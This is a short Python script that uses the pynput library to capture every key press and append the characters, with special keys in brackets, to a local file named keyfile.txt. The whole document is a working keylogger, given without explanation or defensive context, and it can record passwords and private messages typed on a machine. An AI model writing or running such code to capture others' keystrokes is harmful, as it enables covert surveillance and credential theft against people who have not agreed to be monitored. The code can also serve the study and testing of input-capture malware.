from pynput import keyboard

def keyPressed(key):
    try:
        # Handle alphanumeric keys and other character keys
        char = key.char
        if char:
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(char)
    except AttributeError:
        # Handle special keys (e.g., arrow keys, function keys, etc.)
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f'[{key}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
